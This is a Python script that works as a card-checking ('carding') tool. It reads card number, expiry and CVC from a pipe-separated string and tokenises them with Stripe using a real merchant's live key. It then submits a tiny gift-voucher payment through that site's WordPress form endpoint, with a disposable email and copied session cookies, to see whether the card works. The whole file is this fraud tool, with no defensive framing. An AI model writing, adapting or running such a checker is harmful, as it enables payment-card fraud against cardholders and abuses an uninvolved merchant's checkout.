import requests,re
def Tele(ccx):
	import requests
	ccx=ccx.strip()
	n = ccx.split("|")[0]
	mm = ccx.split("|")[1]
	yy = ccx.split("|")[2]
	cvc = ccx.split("|")[3]
	if "20" in yy:#Mo3gza
		yy = yy.split("20")[1]
	r = requests.session()

	headers = {
	    'authority': 'api.stripe.com',
	    'accept': 'application/json',
	    'accept-language': 'en-US,en;q=0.9',
	    'cache-control': 'no-cache',
	    'content-type': 'application/x-www-form-urlencoded',
	    'origin': 'https://js.stripe.com',
	    'pragma': 'no-cache',
	    'referer': 'https://js.stripe.com/',
	    'sec-ch-ua': '"Not)A;Brand";v="24", "Chromium";v="116"',
	    'sec-ch-ua-mobile': '?1',
	    'sec-ch-ua-platform': '"Android"',
	    'sec-fetch-dest': 'empty',
	    'sec-fetch-mode': 'cors',
	    'sec-fetch-site': 'same-site',
	    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36',
	}
	
	data = f'type=card&card[number]={n}&card[cvc]={cvc}&card[exp_month]={mm}&card[exp_year]={yy}&guid=NA&muid=NA&sid=NA&payment_user_agent=stripe.js%2F5ff35eafec%3B+stripe-js-v3%2F5ff35eafec%3B+card-element&referrer=https%3A%2F%2Fnowwherecampers.com&time_on_page=73618&key=pk_live_51Kdd3cBz5lzO6FPOsw9D5Vezy9CUsZZQtkjU1iTCRpogiu2Eq7u0OpnFQd1Pi3ltg5MmvqsrMYq45vIcwuxaLMvJ00LBxYcwez'
	
	r1 = requests.post('https://api.stripe.com/v1/payment_methods', headers=headers, data=data)
	
	pm = r1.json()['id']
	
	cookies = {
	    'asp_transient_id': 'f7f0c6922005eba1402101050f023e6b',
	    'WP_SESSION_COOKIE': 'f8e4f2b5c34bb4bf5765763a420a8f63%7C%7C1732151288%7C%7C1732150928',
	    '_ga_FZD80D4TBR': 'GS1.1.1732149492.1.0.1732149492.0.0.0',
	    '_ga': 'GA1.1.1571250620.1732149493',
	    'cookieyes-consent': 'consentid:WGVJbU1VOWN5UDF5Q3FDczZSa2FJSEQ1cE14aE05U0E,consent:yes,action:yes,necessary:yes,functional:yes,analytics:yes,performance:yes,advertisement:yes',
	    '__stripe_mid': '21ef1ae5-6ae5-4545-9036-e5c00e69d964bfb949',
	    '__stripe_sid': 'c661739f-2721-45c4-b517-3bd8f2e3099e75d44d',
	}
	
	headers = {
	    'authority': 'nowwherecampers.com',
	    'accept': '*/*',
	    'accept-language': 'en-US,en;q=0.9',
	    'cache-control': 'no-cache',
	    'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
	    # 'cookie': 'asp_transient_id=f7f0c6922005eba1402101050f023e6b; WP_SESSION_COOKIE=f8e4f2b5c34bb4bf5765763a420a8f63%7C%7C1732151288%7C%7C1732150928; _ga_FZD80D4TBR=GS1.1.1732149492.1.0.1732149492.0.0.0; _ga=GA1.1.1571250620.1732149493; cookieyes-consent=consentid:WGVJbU1VOWN5UDF5Q3FDczZSa2FJSEQ1cE14aE05U0E,consent:yes,action:yes,necessary:yes,functional:yes,analytics:yes,performance:yes,advertisement:yes; __stripe_mid=21ef1ae5-6ae5-4545-9036-e5c00e69d964bfb949; __stripe_sid=c661739f-2721-45c4-b517-3bd8f2e3099e75d44d',
	    'origin': 'https://nowwherecampers.com',
	    'pragma': 'no-cache',
	    'referer': 'https://nowwherecampers.com/gift-vouchers/',
	    'sec-ch-ua': '"Not)A;Brand";v="24", "Chromium";v="116"',
	    'sec-ch-ua-mobile': '?1',
	    'sec-ch-ua-platform': '"Android"',
	    'sec-fetch-dest': 'empty',
	    'sec-fetch-mode': 'cors',
	    'sec-fetch-site': 'same-origin',
	    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36',
	    'x-requested-with': 'XMLHttpRequest',
	}
	
	params = {
	    't': '1732149566812',
	}
	
	data = {
	    'data': '__fluent_form_embded_post_id=727&_fluentform_4_fluentformnonce=0010e5a463&_wp_http_referer=%2Fgift-vouchers%2F&names%5Bfirst_name%5D=&names%5Blast_name%5D=&email=jemase9334%40exoular.com&input_text=vinsmoke&input_radio=Custom&numeric-field=1.00&numeric-field_1=1&custom-payment-amount=1&payment_method=stripe&__stripe_payment_method_id='+str(pm)+'',
	    'action': 'fluentform_submit',
	    'form_id': '4',
	}
	
	r2 = requests.post(
	    'https://nowwherecampers.com/wp-admin/admin-ajax.php',
	    params=params,
	    cookies=cookies,
	    headers=headers,
	    data=data,
	)
	
	return (r2.json())